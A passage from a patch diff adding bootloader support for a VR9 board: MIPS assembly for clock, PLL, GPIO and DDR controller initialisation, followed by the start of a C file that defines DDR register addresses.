+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03020000
+#elif defined(CONFIG_VR9_CPU_333M_RAM_166M)
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x32
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03020000
+#elif defined(CONFIG_VR9_CPU_393M_RAM_196M)
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x22
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03020000
+#elif defined(CONFIG_VR9_CPU_500M_RAM_250M)
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x12
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03010000 /*PPE 432M freq*/
+#elif defined(CONFIG_VR9_CPU_600M_RAM_200M) 
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x04
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03010000 /*PPE 432M freq*/
+#elif defined(CONFIG_VR9_CPU_600M_RAM_300M)
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x02
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03000000 /*PPE 432M freq*/  
+#else
+      /*fix me, put correct values here*/
+   #define CONFIG_VR9_CGU_SYS_VALUE    0x13
+   #define CONFIG_VR9_CGU_CLKFSR_VALUE 0x03020000
+#endif
+
+
+  .set  noreorder
+
+
+#ifdef CONFIG_CHECK_PLL2_LOCK
+   .align 4
+   .globl  pll2_lock_workaround
+   .ent  pll2_lock_workaround
+
+pll2_lock_workaround: /* workaround code for PLL2 */
+   	move    t4,ra
+	li	t0,0xbf103000
+    lw	t1,0x60(t0)
+	andi	t1,t1,0x2
+	bne	zero,t1,3f  /* PLL2 lock branch to continue */
+	nop
+/* disable_pll2 */
+
+	li	t3,0x10
+1:
+	li	t1, PLL2_DISABLE
+	sw      t1,0x60(t0)
+    li	t1,0x1
+	sw	t1,0x20(t0)
+	bal	delay_asm_1ms
+	nop
+							
+/* enable pll2 at low freq */
+	li	t1, PLL2_HIGH_M
+	sw      t1,0x60(t0)
+	li	t1,0x1
+	sw	t1,0x20(t0)
+    bal	delay_asm_1ms
+	nop
+
+/* Check PLL2 lock at low freq */
+	lw	t1,0x60(t0)
+    andi	t1,t1,0x2
+	bne	zero,t1,2f  /* PLL2 lock branch to continue */
+	nop
+	addi	t3,t3,-1
+	bne	zero,t3,1b
+	nop
+
+/* Set PLL2 to Default Freq */
+2:
+	li	t1, PLL2_DEFAULT
+	sw      t1,0x60(t0)
+    li	t1,0x1
+	sw	t1,0x20(t0)
+	bal	delay_asm_1ms
+	nop
+	
+/* Continue execution */
+3:
+	move	ra,t4
+    j	ra
+	nop
+
+/* Delay routine for 1ms */
+  .align 4
+delay_asm_1ms:
+	li    k1, (CPU_CLOCK_RATE/2000)
+	mtc0  zero, CP0_COUNT
+1:
+  mfc0  k0, CP0_COUNT
+	sub   k0,k1,k0
+	bgez  k0,1b
+	nop
+    j  ra
+	nop
+	
+    .end  pll2_lock_workaround
+#endif
+
+
+
+/*
+ * void cgu_init(long)
+ */
+  .globl  cgu_init
+  .ent  cgu_init
+cgu_init:
+	li  t2, CGU_SYS
+    lw  t2, 0(t2)
+    bne t2, CONFIG_VR9_CGU_SYS_VALUE, 1f /*check if CGU_SYS is correct*/
+    nop
+	
+    li  t2, CGU_CLKFSR
+	lw  t2, 0(t2)
+	bne t2, CONFIG_VR9_CGU_CLKFSR_VALUE, 1f /*check if CGU_CLKFSR is correct*/
+	nop
+	
+freq_up2date:
+    move  t5, ra
+#ifdef CONFIG_CHECK_PLL2_LOCK
+    bal pll2_lock_workaround
+    nop
+#endif
+    move  ra, t5
+    j   ra    /*all values are correct, return*/
+	nop
+	
+1:  
+#if CONFIG_VR9_CRYSTAL_CPLD
+    /*Pull high GPIO44, P2.12, used as output*/
+    /*P2_ALTSEL0 &=~(1<<12)*/
+	li t1, 0xBE100B7C
+	lw t2, 0(t1)
+	li t3, 0xffffefff
+	and t2, t2, t3
+	sw t2, 0(t1)
+
+    /*P2_ALTSEL1 &=~(1<<12)*/
+	li t1, 0xBE100B80
+	lw t2, 0(t1)
+	li t3, 0xffffefff
+	and t2, t2, t3
+	sw t2, 0(t1)
+
+    /*P2_DIR |=1<<12*/
+	li t1, 0xBE100B78
+	lw t2, 0(t1)
+	li t3, 0x1000
+	or t2, t2, t3
+	sw t2, 0(t1)
+	
+	/*P2_OD |=1<<12*/
+    li t1, 0xBE100B84
+	lw t2, 0(t1)
+	li t3, 0x1000
+	or t2, t2, t3
+	sw t2, 0(t1)
+					
+	/*P2_OUT |=1<<12*/
+	li t1, 0xBE100B70
+	lw t2, 0(t1)
+	li t3, 0x1000
+	or t2, t2, t3
+	sw t2, 0(t1)
+
+#if 0
+    /*Pull high GPIO41, P2.9, used as output*/
+	/*P2_ALTSEL0 &=~(1<<9)*/
+	li t1, 0xBE100B7C
+	lw t2, 0(t1)
+	li t3, 0xfffffdff
+    and t2, t2, t3
+    sw t2, 0(t1)
+
+    /*P2_ALTSEL1 &=~(1<<9)*/
+	li t1, 0xBE100B80
+	lw t2, 0(t1)
+	li t3, 0xfffffdff
+	and t2, t2, t3
+    sw t2, 0(t1)
+
+    /*P2_DIR |=1<<9*/
+	li t1, 0xBE100B78
+	lw t2, 0(t1)
+	li t3, 0x200
+	or t2, t2, t3
+	sw t2, 0(t1)
+
+	/*P2_OD |=1<<9*/
+	li t1, 0xBE100B84
+	lw t2, 0(t1)
+	li t3, 0x200
+	or t2, t2, t3
+	sw t2, 0(t1)
+
+	/*P2_OUT |=1<<9*/
+	li t1, 0xBE100B70
+	lw t2, 0(t1)
+	li t3, 0x200
+	or t2, t2, t3
+	sw t2, 0(t1)
+																														
+#endif
+
+    /*setup GPIO13*/ 
+	/*REG32(0xBE100B1C) &= ~0x2000*/
+	li t1, 0xBE100B1C
+	lw t2, 0(t1)
+	li t3, 0xffffdfff
+	and t2, t2, t3
+	sw t2, 0(t1)
+
+	/*REG32(0xBE100B20) &= ~0x2000*/
+	li t1, 0xBE100B20
+	lw t2, 0(t1)
+	li t3, 0xffffdfff
+	and t2, t2, t3
+	sw t2, 0(t1)
+						
+	/*REG32(0xBE100B18) |= 0x2000*/
+	li t1, 0xBE100B18
+	lw t2, 0(t1)
+	li t3, 0x2000
+	or t2, t2, t3
+	sw t2, 0(t1)
+
+	/*REG32(0xBE100B24) |= 0x2000*/
+	li t1, 0xBE100B24
+	lw t2, 0(t1)
+	li t3, 0x2000
+	or t2, t2, t3
+	sw t2, 0(t1)
+					
+    /*Toggle GPIO13 5 times*/					
+	li t0, 0 /*5 times*/
+	li t4, 4
+1:
+	
+	/*REG32(0xBE100B10) |= 0x2000;*/
+	li t1, 0xBE100B10
+    lw t2, 0(t1)
+    li t3, 0x2000
+    or t2, t2, t3
+    sw t2, 0(t1)
+
+    /*delay*/
+    li t1, 0
+delay1:
+	li t2, 0x200
+	addi t1, t1, 1
+	bne t1, t2, delay1
+	nop
+
+	/*REG32(0xBE100B10) &= ~0x2000;*/
+	li t1, 0xBE100B10
+	lw t2, 0(t1)
+	li t3, 0xffffdfff
+	and t2, t2, t3
+	sw t2, 0(t1)
+	
+    /*delay*/
+    li t1, 0
+delay2:
+	li t2, 0x200
+	addi t1, t1, 1
+	bne t1, t2, delay2
+	nop
+	
+    addi t0, t0, 1
+	bne t0, t4, 1b
+    nop
+#endif
+
+    li  t2, CGU_SYS
+    li  a0, CONFIG_VR9_CGU_SYS_VALUE
+    sw  a0, 0(t2)    /*store predefined value to CGU_SYS*/
+    
+	li  t2, CGU_CLKFSR
+    li  a0, CONFIG_VR9_CGU_CLKFSR_VALUE /*store predefined value to CGU_CLKFSR*/
+    sw  a0, 0(t2)
+//#if defined(CONFIG_VR9_CRYSTAL_6M) || defined(CONFIG_VR9_CRYSTAL_CPLD)
+	li  t2, PLL0_CFG
+    li  a0, CONFIG_VR9_PLL0_CFG_VALUE /*store predefined value to PLL0_CFG*/
+	sw  a0, 0(t2)
+
+	li  t2, PLL1_CFG
+	li  a0, CONFIG_VR9_PLL1_CFG_VALUE /*store predefined value to PLL1_CFG*/
+	sw  a0, 0(t2)
+
+	li  t2, PLL2_CFG
+	li  a0, CONFIG_VR9_PLL2_CFG_VALUE /*store predefined value to PLL2_CFG*/
+	sw  a0, 0(t2)
+//#endif	
+    //li  t2, CGU_UPDATE
+    //li  a0, 1
+    //sw  a0, 0(t2) /*write 0x1 to CGU_UPDATE*/
+
+    li  t2, RST_REQ
+    li  a0, 0xe0000000
+    sw  a0, 0(t2)  /*issue global software reset*/
+wait_reset:
+    b   wait_reset
+    nop
+
+    .end  cgu_init
+
+
+
+/*
+ * void ddrram_init(long)
+ */
+  .globl  ddrram_init
+  .ent  ddrram_init
+ddrram_init:
+#ifdef CONFIG_ENABLE_POWER_MANAGEMENT
+   li  t2, PMU_PWDCR1
+   lw  t3, 0(t2)
+   li  t4, 0xffffffBf
+   and t3, t3, t4 /*bit6 set to 0*/
+   sw  t3, 0(t2)
+#endif
+   li  t2, DDR_CCR07
+   li  a0, 0
+   sw  a0, 0(t2) /*put DDR controller inactive*/
+  
+   li  t2, DDR_CCR00
+   li  a0, MC_CCR00_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR01
+   li  a0, MC_CCR01_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR02
+   li  a0, MC_CCR02_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR03
+   li  a0, MC_CCR03_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR04
+   li  a0, MC_CCR04_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR05
+   li  a0, MC_CCR05_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR06
+   li  a0, MC_CCR06_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR07
+   li  a0, MC_CCR07_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR08
+   li  a0, MC_CCR08_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR09
+   li  a0, MC_CCR09_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR10
+   li  a0, MC_CCR10_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR11
+   li  a0, MC_CCR11_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR12
+   li  a0, MC_CCR12_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR13
+   li  a0, MC_CCR13_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR14
+   li  a0, MC_CCR14_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR15
+   li  a0, MC_CCR15_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR16
+   li  a0, MC_CCR16_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR17
+   li  a0, MC_CCR17_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR18
+   li  a0, MC_CCR18_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR19
+   li  a0, MC_CCR19_VALUE
+#ifdef CONFIG_LOWPOWER_AUTO_ENABLE
+   li   t1, 0xe0ffffff 
+   and  a0, a0, t1
+   li   t1, CONFIG_LOWPOWER_AUTO_ENABLE
+   andi t1, t1, 0x1f
+   sll  t1, t1, 24
+   add  a0, a0, t1 
+#endif
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR20
+   li  a0, MC_CCR20_VALUE
+#ifdef CONFIG_LOWPOWER_CONTROL
+   li  t1, 0xffffffe0
+   and a0, a0, t1
+   li  t1, CONFIG_LOWPOWER_CONTROL
+   andi t1, t1, 0x1f
+   add a0, a0, t1
+#endif   
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR21
+   li  a0, MC_CCR21_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR22
+   li  a0, MC_CCR22_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR23
+   li  a0, MC_CCR23_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR24
+   li  a0, MC_CCR24_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR25
+   li  a0, MC_CCR25_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR26
+   li  a0, MC_CCR26_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR27
+   li  a0, MC_CCR27_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR28
+   li  a0, MC_CCR28_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR29
+   li  a0, MC_CCR29_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR30
+   li  a0, MC_CCR30_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR31
+   li  a0, MC_CCR31_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR32
+   li  a0, MC_CCR32_VALUE
+#ifdef CONFIG_LOWPOWER_POWER_DOWN_CNT
+   li  t1, 0xffff0000
+   and a0, a0, t1
+   li  t1, CONFIG_LOWPOWER_POWER_DOWN_CNT
+   andi t1, t1, 0xffff
+   add a0, a0, t1
+#endif      
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR33
+   li  a0, MC_CCR33_VALUE
+#ifdef CONFIG_LOWPOWER_SELF_REFRESH_CNT
+   li  t1, 0xffff0000
+   and a0, a0, t1
+   li  t1, CONFIG_LOWPOWER_SELF_REFRESH_CNT
+   andi t1, t1, 0xffff
+   add a0, a0, t1
+#endif      
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR34
+   li  a0, MC_CCR34_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR35
+   li  a0, MC_CCR35_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR36
+   li  a0, MC_CCR36_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR37
+   li  a0, MC_CCR37_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR38
+   li  a0, MC_CCR38_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR39
+   li  a0, MC_CCR39_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR40
+   li  a0, MC_CCR40_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR41
+   li  a0, MC_CCR41_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR42
+   li  a0, MC_CCR42_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR43
+   li  a0, MC_CCR43_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR44
+   li  a0, MC_CCR44_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR45
+   li  a0, MC_CCR45_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR46
+   li  a0, MC_CCR46_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR47
+   li  a0, MC_CCR47_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR48
+   li  a0, MC_CCR48_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR49
+   li  a0, MC_CCR49_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR50
+   li  a0, MC_CCR50_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR51
+   li  a0, MC_CCR51_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR52
+   li  a0, MC_CCR52_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR53
+   li  a0, MC_CCR53_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR54
+   li  a0, MC_CCR54_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR55
+   li  a0, MC_CCR55_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR56
+   li  a0, MC_CCR56_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR57
+   li  a0, MC_CCR57_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR58
+   li  a0, MC_CCR58_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR59
+   li  a0, MC_CCR59_VALUE
+   sw  a0, 0(t2)
+
+   li  t2, DDR_CCR60
+   li  a0, MC_CCR60_VALUE
+   sw  a0, 0(t2)
+   
+   li  t2, DDR_CCR61
+   li  a0, MC_CCR61_VALUE
+   sw  a0, 0(t2)
+
+#if defined(CONFIG_TUNE_DDR) && defined(CONFIG_BOOT_FROM_NOR)
+   li      t3, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+   lw      t4, 0(t3)
+   li      t3, 0x88888888
+   bne     t3, t4, ddr_not_configured
+   nop
+/*calculate the crc value*/
+    li      t3, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t3, t3, 0x4
+    lw      t4, 0(t3)
+    lw      t5, 4(t3)
+    xor     t4, t4, t5
+    lw      t5, 8(t3)
+    xor     t4, t4, t5
+    lw      t5, 0xc(t3)
+    xor     t4, t4, t5
+    lw      t5, 0x10(t3)
+    xor     t4, t4, t5
+    lw      t5, 0x14(t3)
+    xor     t4, t4, t5
+    lw      t5, 0x18(t3)
+    bne     t4, t5, ddr_not_configured
+    nop
+/*crc correct, load the stored value*/
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x04
+    lw      t2, 0(t2)
+    li      t1, DDR_CCR39
+    sw      t2, 0(t1)
+
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x08
+    lw      t2, 0(t2)
+    li      t1, DDR_CCR40
+    sw      t2, 0(t1)
+    
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x0c
+    lw      t2, 0(t2)
+    li      t1, DDR_CCR43
+    sw      t2, 0(t1)
+    
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x10
+    lw      t2, 0(t2)
+    li      t1, DDR_CCR44
+    sw      t2, 0(t1)
+    
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x14
+    lw      t2, 0(t2)
+    li      t1, 0xBF400420 
+    sw      t2, 0(t1)
+
+    li      t2, IFX_CFG_FLASH_DDR_CFG_START_ADDR
+    addi    t2, t2, 0x18
+    lw      t2, 0(t2)
+    li      t1, 0xBF400428
+    sw      t2, 0(t1)
+
+
+    /*ddr use stored value, put 0 in 0xBE22FF2C*/
+    li      t3, CONFIG_TUNING_STATUS
+    li      t4, 0x0
+    sw      t4, 0(t3)
+    b       2f
+    nop
+
+ddr_not_configured:
+    /*ddr not configured, put 0xff in 0xBE22FF2C*/
+    li      t3, CONFIG_TUNING_STATUS
+    li      t4, 0xff
+    sw      t4, 0(t3)
+    
+    /*set 0 to the 3rd Most significant byte of DDR_CCR39*/
+    li      t2, DDR_CCR39
+    lw      t1, 0(t2);
+    li      a0, 0xFFFF00FF;
+    and     t1, t1, a0
+    sw      t1, 0(t2)
+    
+    /*set 0 to the 3rd Most significant byte of DDR_CCR40*/
+    li      t2, DDR_CCR40
+    lw      t1, 0(t2);
+    li      a0, 0xFFFF00FF;
+    and     t1, t1, a0
+    sw      t1, 0(t2)
+    
+#endif
+2:
+   /*need to disable fpi burst in register "always_last"*/
+   li      t3, 0xBF400430
+   li      t4, 0x04
+   sw      t4, 0(t3)
+
+   li  t2, DDR_CCR07
+   li  a0, 0x1010100
+   sw  a0, 0(t2) /*put DDR controller active*/
+  
+   /*DENALI_CTL_47 and DENALI_CTL_48 registers bit 0 indicates DLL lock status*/
+1:
+   li  t2, DDR_CCR47
+   lw  t2, 0(t2)
+   li  t3, 0x01
+   and t2, t3
+   bne t2, t3, 1b 
+   nop
+   li  t2, DDR_CCR48
+   lw  t2, 0(t2)
+   li  t3, 0x01
+   and t2, t3
+   bne t2, t3, 1b
+   nop 			   
+   j  ra
+   nop
+   .end ddrram_init
+   
+   
+   
+  .globl  lowlevel_init
+  .ent  lowlevel_init
+lowlevel_init:
+  /* EBU, CGU and SDRAM/DDR-RAM Initialization.
+   */
+  move  t6, ra
+
+    bal cgu_init
+    nop
+
+    /*Crystal OSC capup setting*/
+    li      t1, 0xBF106B00   
+    li      t2, 0x3
+	sb      t2, 0(t1)
+
+#ifdef CONFIG_BOOT_FROM_NOR
+#ifdef CONFIG_TUNE_DDR
+    li      t1, DDR_CCR07
+    lw      t1, 0(t1)
+    andi    t1, t1, 0x100
+    bne     t1, zero, ddr_init_finish
+    nop
+#endif
+#endif 
+ 
+  bal ddrram_init
+  nop
+
+
+ddr_init_finish:
+  move  ra, t6
+  j ra
+  nop
+
+  .end  lowlevel_init
diff --git a/board/vr9/nand_spl_board.c b/board/vr9/nand_spl_board.c
new file mode 100644
--- /dev/null
+++ b/board/vr9/nand_spl_board.c
@@ -0,0 +1,361 @@
+#include <config.h>
+#include <common.h>
+#include <command.h>
+#include <asm/addrspace.h>
+#include <asm/vr9.h>
+#include <environment.h>
+#include <nand.h>
+
+
+#define DDR_OFFSET   0xbf401000
+#define DDR_CCR00      (DDR_OFFSET + 0x0000 )
+#define DDR_CCR01      (DDR_OFFSET + 0x0010 )
+#define DDR_CCR02      (DDR_OFFSET + 0x0020 )
+#define DDR_CCR03      (DDR_OFFSET + 0x0030 )
+#define DDR_CCR04      (DDR_OFFSET + 0x0040 )
+#define DDR_CCR05      (DDR_OFFSET + 0x0050 )
+#define DDR_CCR06      (DDR_OFFSET + 0x0060 )
+#define DDR_CCR07      (DDR_OFFSET + 0x0070 )
+#define DDR_CCR08      (DDR_OFFSET + 0x0080 )
+#define DDR_CCR09      (DDR_OFFSET + 0x0090 )
+#define DDR_CCR10      (DDR_OFFSET + 0x00A0 )
+#define DDR_CCR11      (DDR_OFFSET + 0x00B0 )
+#define DDR_CCR12      (DDR_OFFSET + 0x00C0 )
+#define DDR_CCR13      (DDR_OFFSET + 0x00D0 )
+#define DDR_CCR14      (DDR_OFFSET + 0x00E0 )
+#define DDR_CCR15      (DDR_OFFSET + 0x00F0 )
+#define DDR_CCR16      (DDR_OFFSET + 0x0100 )
+#define DDR_CCR17      (DDR_OFFSET + 0x0110 )
+#define DDR_CCR18      (DDR_OFFSET + 0x0120 )
+#define DDR_CCR19      (DDR_OFFSET + 0x0130 )
+#define DDR_CCR20      (DDR_OFFSET + 0x0140 )
+#define DDR_CCR21      (DDR_OFFSET + 0x0150 )
+#define DDR_CCR22      (DDR_OFFSET + 0x0160 )
+#define DDR_CCR23      (DDR_OFFSET + 0x0170 )
+#define DDR_CCR24      (DDR_OFFSET + 0x0180 )
+#define DDR_CCR25      (DDR_OFFSET + 0x0190 )
+#define DDR_CCR26      (DDR_OFFSET + 0x01A0 )
+#define DDR_CCR27      (DDR_OFFSET + 0x01B0 )
+#define DDR_CCR28      (DDR_OFFSET + 0x01C0 )
+#define DDR_CCR29      (DDR_OFFSET + 0x01D0 )
+#define DDR_CCR30      (DDR_OFFSET + 0x01E0 )
+#define DDR_CCR31      (DDR_OFFSET + 0x01F0 )
+#define DDR_CCR32      (DDR_OFFSET + 0x0200 )
+#define DDR_CCR33      (DDR_OFFSET + 0x0210 )
+#define DDR_CCR34      (DDR_OFFSET + 0x0220 )
+#define DDR_CCR35      (DDR_OFFSET + 0x0230 )
+#define DDR_CCR36      (DDR_OFFSET + 0x0240 )
+#define DDR_CCR37      (DDR_OFFSET + 0x0250 )
+#define DDR_CCR38      (DDR_OFFSET + 0x0260 )
+#define DDR_CCR39      (DDR_OFFSET + 0x0270 )
+#define DDR_CCR40      (DDR_OFFSET + 0x0280 )
+#define DDR_CCR41      (DDR_OFFSET + 0x0290 )
+#define DDR_CCR42      (DDR_OFFSET + 0x02A0 )
+#define DDR_CCR43      (DDR_OFFSET + 0x02B0 )
+#define DDR_CCR44      (DDR_OFFSET + 0x02C0 )
+#define DDR_CCR45      (DDR_OFFSET + 0x02D0 )
+#define DDR_CCR46      (DDR_OFFSET + 0x02E0 )
+#define DDR_CCR47      (DDR_OFFSET + 0x02F0 )
+#define DDR_CCR48      (DDR_OFFSET + 0x0300 )
+#define DDR_CCR49      (DDR_OFFSET + 0x0310 )
+#define DDR_CCR50      (DDR_OFFSET + 0x0320 )
+#define DDR_CCR51      (DDR_OFFSET + 0x0330 )
+#define DDR_CCR52      (DDR_OFFSET + 0x0340 )
+#define DDR_CCR53      (DDR_OFFSET + 0x0350 )
+#define DDR_CCR54      (DDR_OFFSET + 0x0360 )
+#define DDR_CCR55      (DDR_OFFSET + 0x0370 )
+#define DDR_CCR56      (DDR_OFFSET + 0x0380 )
+#define DDR_CCR57      (DDR_OFFSET + 0x0390 )
+#define DDR_CCR58      (DDR_OFFSET + 0x03A0 )
+#define DDR_CCR59      (DDR_OFFSET + 0x03B0 )
+#define DDR_CCR60      (DDR_OFFSET + 0x03C0 )
+#define DDR_CCR61      (DDR_OFFSET + 0x03D0 )
+#define DDR_CCR62      (DDR_OFFSET + 0x03E0 )
+#define DDR_CCR63      (DDR_OFFSET + 0x03F0 )
+#define DDR_CCR64      (DDR_OFFSET + 0x0400 )
+#define DDR_CCR65      (DDR_OFFSET + 0x0410 )
+#define DDR_CCR66      (DDR_OFFSET + 0x0420 )
+#define DDR_CCR67      (DDR_OFFSET + 0x0430 )
+#define DDR_CCR68      (DDR_OFFSET + 0x0440 )
+#define DDR_CCR69      (DDR_OFFSET + 0x0450 )
+#define DDR_CCR70      (DDR_OFFSET + 0x0460 )
+#define DDR_CCR71      (DDR_OFFSET + 0x0470 )
+#define DDR_CCR72      (DDR_OFFSET + 0x0480 )
+#define DDR_CCR73      (DDR_OFFSET + 0x0490 )
+#define DDR_CCR74      (DDR_OFFSET + 0x04A0 )
+#define DDR_CCR75      (DDR_OFFSET + 0x04B0 )
+#define DDR_CCR76      (DDR_OFFSET + 0x04C0 )
+#define DDR_CCR77      (DDR_OFFSET + 0x04D0 )
+#define DDR_CCR78      (DDR_OFFSET + 0x04E0 )
+#define DDR_CCR79      (DDR_OFFSET + 0x04F0 )
+#define DDR_CCR80      (DDR_OFFSET + 0x0500 )
+#define DDR_CCR81      (DDR_OFFSET + 0x0510 )
+#define DDR_CCR82      (DDR_OFFSET + 0x0520 )
+#define DDR_CCR83      (DDR_OFFSET + 0x0530 )
+#define DDR_CCR84      (DDR_OFFSET + 0x0540 )
+#define DDR_CCR85      (DDR_OFFSET + 0x0550 )
+#define DDR_CCR86      (DDR_OFFSET + 0x0560 )
+#define DDR_CCR87      (DDR_OFFSET + 0x0570 )
+#define DDR_CCR88      (DDR_OFFSET + 0x0580 )
+#define DDR_CCR89      (DDR_OFFSET + 0x0590 )
+#define DDR_CCR90      (DDR_OFFSET + 0x05A0 )
+#define DDR_CCR91      (DDR_OFFSET + 0x05B0 )
+#define DDR_CCR92      (DDR_OFFSET + 0x05C0 )
+#define DDR_CCR93      (DDR_OFFSET + 0x05D0 )
+#define DDR_CCR94      (DDR_OFFSET + 0x05E0 )
+#define DDR_CCR95      (DDR_OFFSET + 0x05F0 )
+#define DDR_CCR96      (DDR_OFFSET + 0x0600 )
+#define DDR_CCR97      (DDR_OFFSET + 0x0610 )
+#define DDR_CCR98      (DDR_OFFSET + 0x0620 )
+#define DDR_CCR99      (DDR_OFFSET + 0x0630 )
+#define DDR_CCR100     (DDR_OFFSET + 0x0640 )
+#define DDR_CCR101     (DDR_OFFSET + 0x0650 )
+#define DDR_CCR102     (DDR_OFFSET + 0x0660 )
+#define DDR_CCR103     (DDR_OFFSET + 0x0670 )
+#define DDR_CCR104     (DDR_OFFSET + 0x0680 )
+#define DDR_CCR105     (DDR_OFFSET + 0x0690 )
+#define DDR_CCR106     (DDR_OFFSET + 0x06A0 )
+#define DDR_CCR107     (DDR_OFFSET + 0x06B0 )
+#define DDR_CCR108     (DDR_OFFSET + 0x06C0 )
+#define DDR_CCR109     (DDR_OFFSET + 0x06D0 )
+#define DDR_CCR110     (DDR_OFFSET + 0x06E0 )
+#define DDR_CCR111     (DDR_OFFSET + 0x06F0 )
+#define DDR_CCR112     (DDR_OFFSET + 0x0700 )
+#define DDR_CCR113     (DDR_OFFSET + 0x0710 )
+#define DDR_CCR114     (DDR_OFFSET + 0x0720 )
+#define DDR_CCR115     (DDR_OFFSET + 0x0730 )
+#define DDR_CCR116     (DDR_OFFSET + 0x0740 )
+#define DDR_CCR117     (DDR_OFFSET + 0x0750 )
+#define DDR_CCR118     (DDR_OFFSET + 0x0760 )
+#define DDR_CCR119     (DDR_OFFSET + 0x0770 )
+#define DDR_CCR120     (DDR_OFFSET + 0x0780 )
+#define DDR_CCR121     (DDR_OFFSET + 0x0790 )
+#define DDR_CCR122     (DDR_OFFSET + 0x07A0 )
+#define DDR_CCR123     (DDR_OFFSET + 0x07B0 )
+#define DDR_CCR124     (DDR_OFFSET + 0x07C0 )
+#define DDR_CCR125     (DDR_OFFSET + 0x07D0 )
+#define DDR_CCR126     (DDR_OFFSET + 0x07E0 )
+#define DDR_CCR127     (DDR_OFFSET + 0x07F0 )
+#define DDR_CCR128     (DDR_OFFSET + 0x0800 )
+#define DDR_CCR129     (DDR_OFFSET + 0x0810 )
+#define DDR_CCR130     (DDR_OFFSET + 0x0820 )
+#define DDR_CCR131     (DDR_OFFSET + 0x0830 )
+#define DDR_CCR132     (DDR_OFFSET + 0x0840 )
+#define DDR_CCR133     (DDR_OFFSET + 0x0850 )
